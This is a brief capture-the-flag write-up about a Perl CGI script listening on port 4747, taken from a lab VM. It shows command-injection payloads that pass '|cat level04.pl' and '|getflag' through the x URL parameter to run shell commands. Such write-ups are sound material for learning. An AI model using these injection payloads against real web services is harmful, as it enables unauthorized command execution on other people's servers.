# Write up

Here come a perl script `level04.pl`

The perl script listens to the port 4747 and displays the get(x) value
For exemple, with curl directly in the VM : `curl localhost:4747/level04.pl?x=test`
In a web navigator, implying that the VM contains a Host only adaptator : `http://192.168.56.101:4747/level04.pl?x=test`

(The following parts will be resolved on navigator)
We will try a Perl Command Injection here : `http://192.168.56.101:4747/level04.pl?x=|cat%20level04.pl`
Which will display the level04.pl source code on the screen, great.

Using this payload : `http://192.168.56.101:4747/level04.pl?x=|getflag`
We will be able to get the flag with the flag04 rights.


# Softs

- perl

# Sources

http://articles.mongueurs.net/magazines/linuxmag52.html
http://www.biogem.org/downloads/notes/Passing%20Parameters%20via%20CGI.pdf